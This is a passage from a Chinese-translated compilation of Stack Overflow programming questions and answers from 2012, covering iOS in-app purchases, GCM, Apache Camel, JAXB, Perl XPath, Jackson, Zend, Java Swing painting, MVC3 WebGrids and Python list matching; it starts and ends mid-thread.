 -(void)deleteKeyChain:(id)sender {

NSError *error = nil;
NSLog(@"delete!!!!");
[SFHFKeychainUtils deleteItemForUsername:@"someUser" andServiceName:kStoredData            error:&error];

 }

-(void)doFeature:(id)sender {
[newPlayer pause];
if ([self IAPItemPurchased]) {

    // do the feature 2!
   //       featureLabel.text = @"Feature: 2";

} else {
    // not purchased so show a view to prompt for purchase
    askToPurchase = [[UIAlertView alloc]
                     initWithTitle:@"All Features"
                     message:@"Tap refresh anytime to read latest 5 emails. To read all      emails with no ads and to continue reading in the background, please purchase the full version of this app."
                     delegate:self
                     cancelButtonTitle:nil
                     otherButtonTitles:@"OK",@"Later on", nil];
    askToPurchase.delegate = self;
    [askToPurchase show];
    [askToPurchase release];
     }
   }

   #pragma mark StoreKit Delegate

  -(void)paymentQueue:(SKPaymentQueue *)queue updatedTransactions:(NSArray *)transactions     {
for (SKPaymentTransaction *transaction in transactions) {
    switch (transaction.transactionState) {
        case SKPaymentTransactionStatePurchasing:

            // show wait view here
         //        statusLabel.text = @"Processing...";
            break;

        case SKPaymentTransactionStatePurchased:

            [[SKPaymentQueue defaultQueue] finishTransaction:transaction];
            // remove wait view and unlock feature 2
    //        statusLabel.text = @"Done!";
            UIAlertView *tmp = [[UIAlertView alloc]
                                initWithTitle:@"Complete"
                                message:@"You now have the full version of Emails Aloud!!"
                                delegate:self
                                cancelButtonTitle:nil
                                otherButtonTitles:@"Ok", nil];
            [tmp show];
            [tmp release];

            NSError *error = nil;
            [SFHFKeychainUtils storeUsername:@"someUser" andPassword:@"pass"   forServiceName:kStoredData updateExisting:YES error:&error];

            // apply purchase action  - hide lock overlay and
         //   [feature2Btn setBackgroundImage:nil forState:UIControlStateNormal];

            // do other thing to enable the features

            break;

        case SKPaymentTransactionStateRestored:
            [[SKPaymentQueue defaultQueue] finishTransaction:transaction];
            // remove wait view here
            //    statusLabel.text = @"";
            break;

        case SKPaymentTransactionStateFailed:

            if (transaction.error.code != SKErrorPaymentCancelled) {
                NSLog(@"Error payment cancelled=%d",transaction.error.code);
            }
            [[SKPaymentQueue defaultQueue] finishTransaction:transaction];
            // remove wait view here
         //   statusLabel.text = @"Purchase Error!";
            break;

        default:
            break;
        }
      }
    }

-(void)productsRequest:(SKProductsRequest *)request didReceiveResponse:(SKProductsResponse   *)response
 {

   // remove wait view here
   // statusLabel.text = @"";

SKProduct *validProduct = nil;
int count = [response.products count];

if (count>0) {
    validProduct = [response.products objectAtIndex:0];
   [[SKPaymentQueue defaultQueue] restoreCompletedTransactions];
    SKPayment *payment = [SKPayment    paymentWithProductIdentifier:@"com.myapp.shit"];
    [[SKPaymentQueue defaultQueue] addTransactionObserver:self];
    [[SKPaymentQueue defaultQueue] addPayment:payment];

} else {
    UIAlertView *tmp = [[UIAlertView alloc]
                        initWithTitle:@"Not Available"
                        message:@"No products to purchase"
                        delegate:self
                        cancelButtonTitle:nil
                        otherButtonTitles:@"Ok", nil];
    [tmp show];
    [tmp release];
}

 }

  -(void)requestDidFinish:(SKRequest *)request
 {
[request release];
 }

-(void)request:(SKRequest *)request didFailWithError:(NSError *)error
{
 NSLog(@"Failed to connect with error: %@", [error localizedDescription]);
}
    -(void)alertView:(UIAlertView *)alertView clickedButtonAtIndex:(NSInteger)buttonIndex {

if (alertView==askToPurchase) {
    if (buttonIndex==0) {
        // user tapped YES, but we need to check if IAP is enabled or not.
        if ([SKPaymentQueue canMakePayments]) {

            SKProductsRequest *request = [[SKProductsRequest alloc] initWithProductIdentifiers:[NSSet setWithObject:@"com.myapp.shit"]];

            request.delegate = self;
            [request start];

        } else {
            UIAlertView *tmp = [[UIAlertView alloc]
                                initWithTitle:@"Prohibited"
                                message:@"Parental Control is enabled, cannot make a  purchase!"
                                delegate:self
                                cancelButtonTitle:nil
                                otherButtonTitles:@"Ok", nil];
            [tmp show];
            [tmp release];
           }
       }
    }

} 
```

注意：someUser/pass 不是任何人的用户名/密码。这只是我选择将应用程序购买中的用户注册到他们的设备中的文本。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T14:56:46.957

如果您已经使用 iTunes Connect 用户的用户/密码购买了应用程序，则需要查找`SKPaymentTransactionStateRestored`而不是`SKPaymentTransactionStatePurchased`.

`SKPaymentTransactionStatePurchased`对于非消耗性产品，每个用户仅发生一次。尝试在 iTunes Connect 上创建更多测试用户。

# android - 适用于 Android 的 Google 云消息传递

> ID：11955048
> 
> 赞同：1
> 
> 时间：2012-08-14T14:53:46.587
> 
> 标签：android, cordova

我刚刚开始使用带有 phonegap 的谷歌云消息传递，并且我在一个 android 虚拟设备中。

对于客户端应用程序，我选择使用本教程：[https](https://github.com/marknutter/GCM-Cordova) ://github.com/marknutter/GCM-Cordova 。对于服务器端应用程序，我创建了一个包含来自 google 的默认代码的 servlet（参见最后一节）：http: [//developer.android.com/guide/google/gcm/gs.html](http://developer.android.com/guide/google/gcm/gs.html)

对于客户端应用程序，我只想确保将发件人 ID 准确放在哪里，教程说我应该将它放在我在插件文件代码中找到“your_sener_id”的位置，但我找不到任何匹配“your_sender_id”的字符串.

- 对于服务器端应用程序，我有 2 个小问题：这里看到一个名为“设备”的变量，我也应该用发件人 ID 替换它吗？

```
 import com.google.android.gcm.server.*;

    Sender sender = new Sender(myApiKey);
    Message message = new Message.Builder().build();
    MulticastResult result = sender.send(message, devices, 5); 
```

- 对于“gcm-server.jar”，我尝试使用 sdk 管理器下载它，但我添加的链接无法获取。我也尝试直接从网上下载它，但我的服务器不满意它

感谢您的帮助，并为我的英语不好感到抱歉。

# apache-camel - Apache骆驼错误：方法过程不适用于参数

> ID：11955049
> 
> 赞同：-1
> 
> 时间：2012-08-14T14:53:49.030
> 
> 标签：apache-camel, routes, processor

我写了一个简单的路由，它将获取任何 http 请求并将其保存在 file:output 中。一旦保存，就会创建一个处理器，它将读取所有请求。

这是我的代码：

```
import org.apache.camel.CamelContext;
import org.apache.camel.Exchange;
import org.apache.camel.processor.*;
import org.apache.camel.builder.RouteBuilder;
import org.apache.camel.impl.DefaultCamelContext;

public class LoadBalancer {
   public static void main(String args[]) throws Exception {
          CamelContext context = new DefaultCamelContext();

        context.addRoutes(new RouteBuilder() {

            public void configure() {
                from("jetty://http://localhost:8080")
                .to("file:output");
                from("file://output").process(new processor()
                {
                    public void process(Exchange e)
                    {
                        System.out.println("Recieved exchange:" + e.getIn());
                    }
                }
                );
                //.loadBalance().roundRobin().to("http://172.28.39.138:8080","http://172.168.20.118:8080");
            }
        }); 

        context.start();

        Thread.sleep(100000);  
        context.stop();
    }
 } 
```

现在当我编译它时，我收到以下错误：

```
 Exception in thread "main" java.lang.Error: Unresolved compilation problems: 
    The method process(Processor) in the type ProcessorDefinition<RouteDefinition> is not applicable for the arguments (new processor(){})
    processor cannot be resolved to a type

On the line `from("file://output").process(new processor()`

I couldn't figure out what kind of error it it.
    Am I doing anything wrong in the code?
    Any help would be very much appreciated.

    Cheers!! 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T22:59:05.150

内联[处理器](http://camel.apache.org/processor.html)应该这样写......

```
from("file://output").process(new Processor() {
    public void process(Exchange exchange) throws Exception {
        System.out.println("Recieved exchange:" + e.getIn());
   }
}); 
```

# java - 使用 SAX 解析器时，不会使用 JAXB 2 解组 XML 属性

> ID：11955050
> 
> 赞同：0
> 
> 时间：2012-08-14T14:53:49.720
> 
> 标签：java, xml, jaxb

我已经使用 XJC 工具从 XSD 派生了我的 Java 类。解组在默认设置下工作正常。但是我已经切换到 SAX 解析器实现（来自 SAXSource 这里：[http](http://docs.oracle.com/javase/6/docs/api/index.html?javax/xml/bind/JAXBContext.html) : //docs.oracle.com/javase/6/docs/api/index.html?javax/xml/bind/JAXBContext.html ）现在解组是当然快 2 倍，但 XML 属性不会被解组。这意味着定义为的属性

```
@XmlAttribute(required=true)
@XmlSchemaType(name = "anySimpleType")
protected String messageId; 
```

设置为`null`。在 XML 我有

```
<Message messageId="123">
...
</Message> 
```

其他一切都得到正确解组。我对所有使用属性的对象都有这个问题。

我有 SAX 解析器的 Apache Xerces 实现。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-16T11:05:17.847

似乎 JAXB 不能与 SAX 解析器一起正常工作，除非解析器设置为可识别名称空间并设置了正确的名称空间。DOM 解析器在命名空间感知属性设置为 false 时工作正常。

# xml - Perl XML::LibXML $node->findnodes($xpath) 找到不应该的节点

> ID：11955052
> 
> 赞同：13
> 
> 时间：2012-08-14T14:53:52.367
> 
> 标签：xml, perl, xpath, xml-libxml

这是我遇到问题的一些代码，我处理了一些 XML，并在 OO 类中的一个方法中从文档中重复的几个节点中的每个节点中提取一个元素。每个节点的子树中应该只有一个这样的元素，但我的代码获取所有元素，就好像它对整个文档进行操作一样。

因为我只希望得到 oine 元素，所以我只使用数组的第零个元素，这会导致我的函数输出错误的值（文档中的所有项目都相同）

这是一些说明问题的简化代码

```
$ cat t4.pl
#!/usr/bin/perl
use strict;
use warnings;
use XML::LibXML;

my $xml = <<EndXML;
<Envelope>
  <Body>
    <Reply>
      <List>
        <Item>
          <Id>8b9a</Id>
          <Message>
            <Response>
              <Identifier>55D</Identifier>
            </Response>
          </Message>
        </Item>
        <Item>
          <Id>5350</Id>
          <Message>
            <Response>
              <Identifier>56D</Identifier>
            </Response>
          </Message>
        </Item>
      </List>
    </Reply>
  </Body>
</Envelope>
EndXML

my $foo = Foo->new();

my $parser = XML::LibXML->new();
my $doc    = $parser->parse_string( $xml );
my @list   = $doc->getElementsByTagName( 'Item' );

for my $item ( @list ) {

    my $id = get( $item, 'Id' );
    my @messages = $item->getElementsByLocalName( 'Message' );

    for my $message ( @messages ) {

        my @children = $message->getChildNodes();

        for my $child ( @children ) {

            my $name = $child->nodeName;

            if ( $name eq 'Response' ) {
                print "child is a Response\n";
                $foo->do( $child, $id );
            }
            elsif ( $name eq 'text' ) {

                # ignore whitespace between elements
            }
            else {
                print "child name is '$name'\n";
            }
        }    # child
    }    # Message
}    # Item

# ..............................................

sub get {
    my ( $node, $name ) = @_;

    my $value   = "(Element $name not found)";
    my @targets = $node->getElementsByTagName( $name );

    if ( @targets ) {
        my $target = $targets[0];
        $value = $target->textContent;
    }

    return $value;
}

# ..............................................

package Foo;

sub new {
    my $self = {};
    bless $self;
    return $self;
}

sub do {
    my $self = shift;
    my ( $node, $id ) = @_;

    print '-' x 70, "\n", ' ' x 12, $node->toString( 1 ), "\n", '-' x 70, "\n";

    my @identifiers = $node->findnodes( '//Identifier' );
    print "do() found ", scalar @identifiers, " Identifiers\n";

    print "$id, ", $identifiers[0]->textContent, "\n\n";
} 
```

这是输出

```
$ perl t4.pl
child is a Response
----------------------------------------------------------------------
            <Response>
              <Identifier>55D</Identifier>
            </Response>
----------------------------------------------------------------------
do() found 2 Identifiers
8b9a, 55D

child is a Response
----------------------------------------------------------------------
            <Response>
              <Identifier>56D</Identifier>
            </Response>
----------------------------------------------------------------------
do() found 2 Identifiers
5350, 55D 
```

我期待

```
do() found 1 Identifiers 
```

我期待最后一行是

```
5350, 56D 
```

由于平台问题，我正在使用旧版本的 XML::LibXML。

**Q：以后的版本是否存在这个问题，还是我做错了什么？**

* * *

## 回答 #1

> 赞同：22
> 
> 时间：2012-08-14T15:23:03.397

来自[XPath 1.0 的文档](http://www.w3.org/TR/xpath/#path-abbrev)

> ***//para 选择文档根***的所有 para 后代

 *（强调我自己的）。所以你的电话

```
$node->findnodes( '//Identifier' ) 
```

忽略上下文节点`$node`并搜索`Identifier`文档中任何位置的所有元素

要获取`Identifier`上下文节点的所有后代，您必须添加一个点，如下所示

```
$node->findnodes('.//Identifier'); 
```

但是因为`$node`它总是一个`Response`元素并且`Identifier`是你的直接孩子，`Response`你可以写

```
$node->findnodes('Identifier'); 
```

* * *

你似乎把自己写得有点累了。我知道您已将代码缩减为示例，但是您*真的*需要单独的包吗？明智地应用 XPath 可以做很多事情。

最明显的变化是你不需要遍历*所有*的孩子——你可以简单地挑选出你感兴趣的孩子。

这个重构的代码可能值得一读

```
use strict;
use warnings;

use XML::LibXML;

my $parser = XML::LibXML->new;
my $doc    = $parser->parse_fh(*DATA);

for my $item ( $doc->findnodes('//Item') ) {

    print "\n";

    my ($id) = $item->findvalue('Id');
    printf "Item Id: %s\n", $item->findvalue('Id');

    my @messages = $item->findnodes('Message');

    for my $message (@messages) {
        my ($response) = $message->findnodes('Response');
        printf "Response Identifier: %s\n", $response->findvalue('Identifier');
    }
}

__DATA__
<Envelope>
  <Body>
    <Reply>
      <List>
        <Item>
          <Id>8b9a</Id>
          <Message>
            <Response>
              <Identifier>55D</Identifier>
            </Response>
          </Message>
        </Item>
        <Item>
          <Id>5350</Id>
          <Message>
            <Response>
              <Identifier>56D</Identifier>
            </Response>
          </Message>
        </Item>
      </List>
    </Reply>
  </Body>
</Envelope> 
```

**输出**

```
Item Id: 8b9a
Response Identifier: 55D

Item Id: 5350
Response Identifier: 56D 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-04-08T15:59:27.487

我对代码的质量没有评论，但是`XML::DOM`在我使用之前学会了使用，我`XML::LibXML`倾向于使用一些 DOM 语法。我一直在努力改掉这个习惯:)。
我提到这一点的原因是因为我看到您已经使用等效的`->item(0)`方法从节点列表中获取第一个位置，就像在 DOM 中一样。
`XML::LibXML`支持使用，`->item()`但从 cpan 我可以看到 xpath 创建的节点列表`1`不是从`0`DOM 开始的。我很确定，如果您将代码保持原样并寻找第一个数组位置而不是第 0 个，您将得到您想要的结果。
不清楚的是为什么`->item(0)`给你最后一个结果，就像我的测试一样（它是否可能从一个数组值偏移，所以你实际上返回了第 -1 个数组值）*

# java - 使用 Jackson 库反序列化非指定对象

> ID：11955056
> 
> 赞同：0
> 
> 时间：2012-08-14T14:53:57.960
> 
> 标签：java, android, jackson

这与[这个](https://stackoverflow.com/questions/11865533/serialising-a-class-member-into-json-object)问题有关，但我想反序列化而不是序列化

我从服务器收到一个 json 对象..

json 对象中的值之一可以是字符串或字符串数​​组。

可以通过定义一个对象并像这样转换它来使其工作。

```
@JsonProperty("integration/enabled-mime-types") public Object object;

List<String> list = (List<String>) object; 

String string = (String) object; 
```

但是我想将此作为列表而不是对象。我正在使用的代码是这个

```
@JsonDeserialize
@JsonProperty("integration/enabled-mime-types")
public void setMimeTypes(Object object) {
    if(object instanceof List) {
        this.mimeTypesArray =  (ArrayList<String>) object;
    } else {
        this.mimeTypesArray.add((String) object);
    }
} 
```

但永远不会设置列表。如何解决这个问题？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-15T10:15:07.953

问题是我有另一个数组设置器，并用@JsonIgnore 对其进行了注释。这导致对象映射器忽略所有设置器，而不仅仅是唯一的注释

# zend-framework - 主键列 (id) 不是此表中的列 ()

> ID：11955062
> 
> 赞同：3
> 
> 时间：2012-08-14T14:54:17.910
> 
> 标签：zend-framework, primary-key, wamp

我正在关注：http: [//framework.zend.com/manual/en/learning.quickstart.create-model.html](http://framework.zend.com/manual/en/learning.quickstart.create-model.html)。

不断地碰壁问题。我目前的错误是以下错误：

```
 An error occurred

Application error

Exception information:

Message: Primary key column(s) (id) are not columns in this table ()

Stack trace:

#0 C:\wamp\www\zendtest\quickstart\library\Zend\Db\Table\Abstract.php(982): Zend_Db_Table_Abstract->_setupPrimaryKey()
#1 C:\wamp\www\zendtest\quickstart\library\Zend\Db\Table\Select.php(100): Zend_Db_Table_Abstract->info()
#2 C:\wamp\www\zendtest\quickstart\library\Zend\Db\Table\Select.php(78): Zend_Db_Table_Select->setTable(Object(Application_Model_DbTable_Guestbook))
#3 C:\wamp\www\zendtest\quickstart\library\Zend\Db\Table\Abstract.php(1018): Zend_Db_Table_Select->__construct(Object(Application_Model_DbTable_Guestbook))
#4 C:\wamp\www\zendtest\quickstart\library\Zend\Db\Table\Abstract.php(1326): Zend_Db_Table_Abstract->select()
#5 C:\wamp\www\zendtest\quickstart\application\models\GuestbookMapper.php(58): Zend_Db_Table_Abstract->fetchAll()
#6 C:\wamp\www\zendtest\quickstart\application\controllers\GuestbookController.php(14): Application_Model_GuestbookMapper->fetchAll()
#7 C:\wamp\www\zendtest\quickstart\library\Zend\Controller\Action.php(516): GuestbookController->indexAction()
#8 C:\wamp\www\zendtest\quickstart\library\Zend\Controller\Dispatcher\Standard.php(295): Zend_Controller_Action->dispatch('indexAction')
#9 C:\wamp\www\zendtest\quickstart\library\Zend\Controller\Front.php(954): Zend_Controller_Dispatcher_Standard->dispatch(Object(Zend_Controller_Request_Http), Object(Zend_Controller_Response_Http))
#10 C:\wamp\www\zendtest\quickstart\library\Zend\Application\Bootstrap\Bootstrap.php(97): Zend_Controller_Front->dispatch()
#11 C:\wamp\www\zendtest\quickstart\library\Zend\Application.php(366): Zend_Application_Bootstrap_Bootstrap->run()
#12 C:\wamp\www\zendtest\quickstart\public\index.php(26): Zend_Application->run()
#13 {main}  
Request Parameters:

array (
  'controller' => 'guestbook',
  'action' => 'index',
  'module' => 'default',
) 
```

但我确信我的表有一个表的主键 ID：

```
CREATE TABLE guestbook (
    id INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,
    email VARCHAR(32) NOT NULL DEFAULT 'noemail@test.com',
    comment TEXT NULL,
    created DATETIME NOT NULL
);

CREATE INDEX "id" ON "guestbook" ("id"); 
```

不明白为什么会出错。

我怎样才能看到它是否甚至选择了正确的数据库

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-14T20:42:56.377

`Zend_Db_Table_Abstract`包含一个名为的受保护属性`_primary`，默认为`id`.

它假定这`id`是表的主键并且是一个序列（自动增量）。

由于你的表定义说这`id`是一个主键，你应该去掉第二个在`id`列上添加索引的 SQL 命令。由于它已经是主键，因此它是一个索引。

删除表并使用您在问题中的 create table 语句重新创建它，只是不要这样做`CREATE INDEX`。之后，您应该能够继续。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-15T06:39:50.030

我认为您的 SQL 架构不正确。尝试像这样创建具有主 kyy 的表：

```
CREATE TABLE guestbook (
    id INTEGER NOT NULL AUTO_INCREMENT,
    email VARCHAR(32) NOT NULL DEFAULT 'noemail@test.com',
    comment TEXT NULL,
    created DATETIME NOT NULL,
    PRIMARY KEY (id)
); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-04T15:33:46.677

此错误可能是由（意外）使用**md5(null)**作为缓存 ID 引起的。或任何其他习惯值，例如 1、0、真、假。但是，在这种情况下，null 很可能是罪魁祸首，因为它可能是由未定义的变量产生的。

修复可能很简单：

```
 $cache = Zend_Registry::get('cache');
    $cache->remove(md5(null)); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-12-13T09:18:10.263

我遇到过同样的问题。问题是数据库是在 guestbook-dev.db 而不是 guestbook.db 中创建的。您可以通过查看此文件来检查它。解决方案是将 scripts/load.sqlite.php 从更改
`defined('APPLICATION_ENV') || define('APPLICATION_ENV', (null === $env) ? 'development' : $env);`
为：
`defined('APPLICATION_ENV') || define('APPLICATION_ENV', (null === $env) ? 'production' : $env);`
，当然，再次运行脚本。

# java - Java - 使用方法和构造函数绘制图形

> ID：11955063
> 
> 赞同：2
> 
> 时间：2012-08-14T14:54:19.183
> 
> 标签：java, graphics

我正在开发一个 java 2d 游戏库。我希望每次调用一个名为`paintImage()`do的方法。`graphics.drawImage()``paintImage()`

```
public void paintImage(image1, x, y){        
    //i want it to run graphics.drawImage every time it is called.        
}

public void anotherMethod(){        
    paintImage(...);
    paintImage(...);
    //paint as many times as i want.        
}

public void paintComponent(Graphics graphics){
    graphics.drawImage();
    super.paintComponents();
} 
```

感谢您的宝贵时间，请留下一个建议，抱歉，这很难解释。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-14T15:16:40.700

**对于单图像显示**

```
public class DrawingDemo {    
    private JPanel panel;
    private MyImage imageData;

    public DrawingDemo() {
        ...            
        panel = new JPanel() {
            @Override
            public void paintComponent(Graphics g) {
                super.paintComponent(g);
                if (imageData != null) {
                    g.drawImage(imageData.getImage(), imageData.getX(), imageData.getY(), this);
                }

            }
        };
        ...
    }

    public void paintImage(Image image1, int x, int y) {
        imageData = new MyImage(image1, x, y);
        panel.repaint();
    }

    public void anotherMethod() {
        paintImage(...);
        paintImage(...);
    }
}

public class MyImage {    // bean class for storing image information
    private Image image;
    private int x;
    private int y;

    public MyImage(Image image, int x, int y) {
        this.image = image;
        this.x = x;
        this.y = y;
    }

    public Image getImage(){
        return image;
    }

    public int getX(){
        return x;
    }

    public int getY(){
        return y;
    }
    ... you can add setter methods
} 
```

**更新：用于多图像显示**

```
 private JPanel panel;
    private ArrayList<MyImage> imageData; // or any other data structure you like

    public DrawingDemo() {
        imageData = new ArrayList<>();
        JFrame frame = new JFrame();
        frame.setSize(800, 600);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        panel = new JPanel() {

            @Override
            public void paintComponent(Graphics g) {
                super.paintComponent(g);
                for (MyImage myImage : imageData) {
                    g.drawImage(myImage.getImage(), myImage.getX(), myImage.getY(), this);
                }
            }
        };
        frame.add(panel);
        frame.setVisible(true);

    }

    public void paintImage(Image image1, int x, int y) {
        imageData.add(new MyImage(image1, x, y));
        panel.repaint();
    }

    public void anotherMethod() {
        paintImage(new ImageIcon("/home/blackadmin/Desktop/image.jpg").getImage(), 0, 0);
        paintImage(new ImageIcon("/home/blackadmin/Desktop/image2.jpg").getImage(), 50, 50);
        paintImage(new ImageIcon("/home/blackadmin/Desktop/image3.jpg").getImage(), 100, 100);
    } 
```

**输出：** ![在此处输入图像描述](../Images/aa0ebfd80e5ea8a080603a4aa8e34c63.png) 看看这个[答案](https://stackoverflow.com/questions/7190645/tooltip-text-erases-panel-drawing-in-java#answer-7190690)
如果你有什么不明白的评论，希望这会有所帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-14T17:50:30.780

我认为您想要做的是更改类中的某些状态，然后根据这些状态更改重新绘制图像 - 换句话说，也许您正在寻找动画。如果是这样，那么您的图像绘制都应该在使用其 Graphics 对象的 paintComponent 方法中完成，或者在由 paintComponent 调用的另一个方法中完成，该方法使用传递给 paintCocalzmponent 的 Graphics 对象。这可以通过将 Graphics 参数传递给另一个方法来完成。然后，您`anotherMethod`将通过调用请求 JVM 重新绘制 GUI `repaint()`。例如：

```
public void anotherMethod() {
    x++;
    y++;
    repaint(); // this will stimulate JVM to call paint/paintComponent
}

private void paintImage(Graphics g, BufferedImage img, int x, int y2) {
    g.drawImage(img, x, y2, this);
}

protected void paintComponent(Graphics g) {
    super.paintComponent(g);
    paintImage(g, image1, x, y);
} 
```

一个完整的例子如下：

```
import java.awt.Color;
import java.awt.Dimension;
import java.awt.Graphics;
import java.awt.Graphics2D;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.awt.image.BufferedImage;
import java.beans.Transient;

import javax.swing.*;

public class PaintEg extends JPanel {

    private static final int IMG_W = 30;
    private static final int IMG_H = IMG_W;
    private static final int PREF_W = 400;
    private static final int PREF_H = PREF_W;
    private static final int TIMER_DELAY = 20;
    private BufferedImage image1;
    private int x;
    private int y;

    public PaintEg() {
        image1 = createImg();
        new Timer(TIMER_DELAY, new ActionListener() {

            @Override
            public void actionPerformed(ActionEvent arg0) {
                anotherMethod();
            }
        }).start();
    }

    private BufferedImage createImg() {
        BufferedImage img = new BufferedImage(IMG_W, IMG_H, BufferedImage.TYPE_INT_ARGB);
        Graphics2D g2 = img.createGraphics();
        g2.setBackground(Color.red);
        g2.clearRect(0, 0, IMG_W, IMG_H);
        g2.setColor(Color.blue);
        g2.fillRect(IMG_W / 4, IMG_H / 4, IMG_W / 2, IMG_H / 2);
        g2.dispose();
        return img;
    }

    public Dimension getPreferredSize() {
        return new Dimension(PREF_W, PREF_H);
    }

    public void anotherMethod() {
        x++;
        y++;
        repaint(); // this will stimulate JVM to call paint/paintComponent
    }

    private void paintImage(Graphics g, BufferedImage img, int x, int y2) {
        g.drawImage(img, x, y2, this);
    }

    protected void paintComponent(Graphics g) {
        super.paintComponent(g);
        paintImage(g, image1, x, y);
    }

    private static void createAndShowGUI() {
        PaintEg paintEg = new PaintEg();

        JFrame frame = new JFrame("PaintEg");
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.getContentPane().add(paintEg);
        frame.pack();
        frame.setLocationRelativeTo(null);
        frame.setVisible(true);
    }

    public static void main(String[] args) {
        SwingUtilities.invokeLater(new Runnable() {
            public void run() {
                createAndShowGUI();
            }
        });
    }
} 
```

# asp.net-mvc-3 - MVC3 递归嵌套 webgrid

> ID：11955067
> 
> 赞同：1
> 
> 时间：2012-08-14T14:54:33.150
> 
> 标签：asp.net-mvc-3, webgrid

我在嵌套 webgrids 时遇到了一些麻烦。

只要我只需要在另一个 webgrid 中有 1 个 webgrid 就可以了，但是一旦我尝试将 webgrid 嵌套在已经嵌套的 webgrid 中，它就会失败。

这是我的代码：

```
@grid.GetHtml(columns:
grid.Columns(
    grid.Column("Name"),
    grid.Column("Variants", format: (item) =>
    {
        WebGrid varGrid = varGrid = new WebGrid(item.Variant);
        return varGrid.GetHtml(
                columns: varGrid.Columns(
                    varGrid.Column("Name")

                ),
                displayHeader : false
        );
    }),
    grid.Column("Resource", format: (item) =>
    {
        WebGrid resGrid = new WebGrid(item.Resource);
        return resGrid.GetHtml(
            columns: resGrid.Columns(
                resGrid.Column("Name"),
                resGrid.Column("Parameters", format: (item) =>
                {
                    WebGrid resParamGrid = new WebGrid(item.Resource.Parameter);
                    return resParamGrid.GetHtml(
                    columns: resParamGrid.Columns(
                            resParamGrid.Column("Name")
                            ),
                            displayHeader: false
                        );
                })
            ),
            displayHeader: false
        );
    }),
    grid.Column("Parameter", format: (item) =>
    {
        WebGrid parGrid = new WebGrid(item.Parameter);
        return parGrid.GetHtml(
            columns: parGrid.Columns(
                    parGrid.Column("Name")
            ),
            displayHeader: false
        );
    })
)
) 
```

所以网格有另一个网格，`Resources`。每个`Resources`网格都有一个包含参数的网格。

在 VS 中没有错误，但是当我尝试运行应用程序时，它返回错误：

> “编译器错误消息：CS1502：'System.Web.Helpers.WebGrid.Column(string, string, System.Func, string, bool)' 的最佳重载方法匹配有一些无效参数”

用指向这个地方的指针：

`grid.Column("Resource", format: (item) =>`

不可能有递归嵌套的网络网格，还是我做错了什么？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-14T16:08:15.410

重复`item`变量两次是个问题。尝试重命名它：

```
grid.Column("Resource", format: (item) =>
{
    WebGrid resGrid = new WebGrid(item.Resource);
    return resGrid.GetHtml(
        columns: resGrid.Columns(
            resGrid.Column("Name"),
            resGrid.Column("Parameters", format: (resource) =>
            {
                WebGrid resParamGrid = new WebGrid(resource.Parameter);
                return resParamGrid.GetHtml(
                    columns: resParamGrid.Columns(
                        resParamGrid.Column("Name")
                    ),
                    displayHeader: false
                );
            })
        ),
        displayHeader: false
    );
}) 
```

# python - 遍历两个列表，第一个列表只通过第一个值

> ID：11955069
> 
> 赞同：-2
> 
> 时间：2012-08-14T14:54:43.197
> 
> 标签：python, arrays, list

我有两个列表，其中一个包含名字和姓氏的列表（作为一个列表项）：

`FLIST = ["Mary Smith", "Kevin Bacon"]`所以。

然后我有另一个列表

`JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"]]`， 所以。

我正在使用以下输出：

```
ultralist = []

for item in FList:
    for row in JG:
        if row[1] == item:
            ultralist.append(row) 
```

现在我希望得到 JG 中的行列表，其中 row[1] 的值 == 到 FList 中的一个列表项，但这仅发生在 FList 的第一个值上。

谁能告诉我为什么以及我必须做些什么来完成这项工作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-08-14T15:00:32.627

您的代码似乎工作得很好：

```
>>> FList = ["Mary Smith", "Kevin Bacon"]
>>> JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
>>> ultralist = []
>>> for item in FList:
    for row in JG:
        if row[1] == item:
            ultralist.append(row)

>>> ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']] 
```

出了什么问题？

* * *

当我这样做时，这将是一个更好的方法。您不需要两个 for 循环：

```
>>> FList = ["Mary Smith", "Kevin Bacon"]
>>> JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
>>> ultralist = []
>>> for row in JG:
        if row[1] in FList:
                ultralist.append(row)

>>> ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']] 
```

这种方法更简洁，使代码更容易理解。首先，您尝试对`JG`: 执行操作，查找其中符合特定条件的元素。所以首先迭代`JG`而不是迭代已经很清楚了`FList`。然后，您可以使用快捷方式，而不是执行显式循环`FList`以查看是否有任何名称匹配。无论如何，这在内部执行了一个 for 循环，但是很清楚代码的意图是什么。`row[1]``row[1] in FList`

更快的是使用`set`for `FList`：

```
>>> FList = set(["Mary Smith", "Kevin Bacon"])
>>> JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
>>> ultralist = []
>>> for row in JG:
        if row[1] in FList:
                ultralist.append(row)

>>> ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']] 
```

请注意，循环代码不会改变。不同的是，`in`集合的操作比列表快得多。您不必遍历每个元素，而是进行一些花哨的哈希查找。

更好的是只使用[列表理解](http://docs.python.org/tutorial/datastructures.html#list-comprehensions)：

```
>>> FList = set(["Mary Smith", "Kevin Bacon"])
>>> JG = [[3928, "Mary Smith"], [2920, "Jacob Francis"], [7777, "Kevin Bacon"]]
>>> ultralist = [row for row in JG if row[1] in FList]
>>> ultralist
[[3928, 'Mary Smith'], [7777, 'Kevin Bacon']] 
```

这段代码更简洁，因此更容易理解。

* * *

## 回答 #2

